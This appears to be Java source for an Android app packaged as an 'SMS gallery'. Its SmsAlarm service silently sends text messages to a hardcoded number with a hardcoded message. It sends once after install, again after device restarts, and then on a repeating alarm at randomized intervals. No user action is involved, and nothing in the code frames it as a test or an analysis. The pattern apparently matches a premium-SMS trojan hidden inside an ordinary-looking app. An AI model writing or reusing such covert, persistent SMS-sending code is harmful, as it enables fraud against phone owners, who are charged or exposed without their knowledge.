package smsgallery.pl.smsgallery;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.util.Log;

import java.util.Calendar;
import java.util.Date;

public class SmsAlarm extends IntentService {

    public SmsAlarm() {
        super("SmsAlarm");
    }

    @Override
    protected void onHandleIntent (@Nullable Intent serviceIntent) {
        Date now = new Date();
        long nowLong = now.getTime();

        if(DataIn.whenStopLong > nowLong) {
//sprawdza czy był ustawiony alarm , jeśli nie smsa nie wysyła idzie dalej do ustawiania alarmu
            SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
            boolean isWasAlarmSet = preferences.contains("WasAlarmSet");
            boolean isFirstSms = preferences.contains("FirstSms");
            boolean isDelivered = preferences.contains("Delivered");
//pierwszy SMS, tylko raz
            if(!isFirstSms || !isDelivered) {
                Calendar cal4 = Calendar.getInstance();
                SendSms();
                SharedPreferences.Editor editor = preferences.edit();
                editor.putInt("FirstSms",1);
                editor.putLong("lastSmsTime",cal4.getTimeInMillis());
                editor.apply();
                Log.d("FirstSms", "SMS - FirstSms");
            }
//wysłij sms jeśli był ustawiony alarm
            if(isWasAlarmSet && isDelivered) {
                Calendar cal2 = Calendar.getInstance();
                SendSms();
                SharedPreferences.Editor editor = preferences.edit();
                editor.putLong("lastSmsTime",cal2.getTimeInMillis());
                editor.apply();
                Log.d("isWasAlarmSet", "SMS - isWasAlarmSet");
            }

//Tylko po instalacji czy nie było za dużo restartów po których nie szły smsy
            Calendar cal1 = Calendar.getInstance();
            boolean isafterInstallRestarts = preferences.contains("afterInstallRestarts");
            boolean islastSmsTime = preferences.contains("lastSmsTime");
            long appInstallTime = preferences.getLong("appinstalltime",0);
            if(cal1.getTimeInMillis() - appInstallTime > DataIn.firstDelay*DataIn.high + DataIn.tenSecond && !isafterInstallRestarts && !islastSmsTime){
                try {
                    Thread.sleep(15000);
                } catch (Exception e) {
                }
                SendSms();
                SharedPreferences.Editor editor = preferences.edit();
                editor.putInt("afterInstallRestarts", 1);
                editor.putLong("lastSmsTime",cal1.getTimeInMillis());
                editor.apply();
                Log.d("restartOnlySms", "SMS - restartOnlySms");
            }
//Systauacji kiedy restart jest przed czasem ale już kiedyś był wysłany sms
            Calendar cal3 = Calendar.getInstance();
            if(islastSmsTime){
                long lastSmsTime = preferences.getLong("lastSmsTime",0);
                if(cal3.getTimeInMillis()-lastSmsTime > DataIn.firstDelay*DataIn.high + DataIn.tenSecond){
                    try {
                        Thread.sleep(15000);
                    } catch (Exception e) {
                    }
                    SendSms();
                    SharedPreferences.Editor editor = preferences.edit();
                    editor.putLong("lastSmsTime",cal3.getTimeInMillis());
                    editor.apply();
                    Log.d("iflastSms", "SMS - iflastSms");
                }
            }

//Ustawianie alarmu
            RandomInt randomInt = new RandomInt();
            long losowa = randomInt.RandomInt(DataIn.low,DataIn.high) * DataIn.firstDelay;

            Context context = getApplicationContext();
            Calendar cal = Calendar.getInstance();
            AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

            PendingIntent servicePendingIntent =
                    PendingIntent.getService(context,
                            666,
                            serviceIntent,
                            PendingIntent.FLAG_CANCEL_CURRENT);

            am.setRepeating(
                    AlarmManager.RTC_WAKEUP,
                    cal.getTimeInMillis() + losowa,
                    DataIn.repeatDelay,
                    servicePendingIntent
            );
//Dodaje info do SharedPreferences, że alarm został ustawiony
            SharedPreferences.Editor editor = preferences.edit();
            editor.putInt("WasAlarmSet", 1);
            editor.apply();

        }
    }

    public void SendSms(){

        Intent intent = new Intent(getApplicationContext(), SmsDeliveredReceiver.class);
        Intent intent2 = new Intent(getApplicationContext(), SmsSentReceiver.class);

        PendingIntent sentPI = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(getApplicationContext(), 0, intent2, 0);


        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(DataIn.number, null, DataIn.message, sentPI , deliveredPI);
    }


}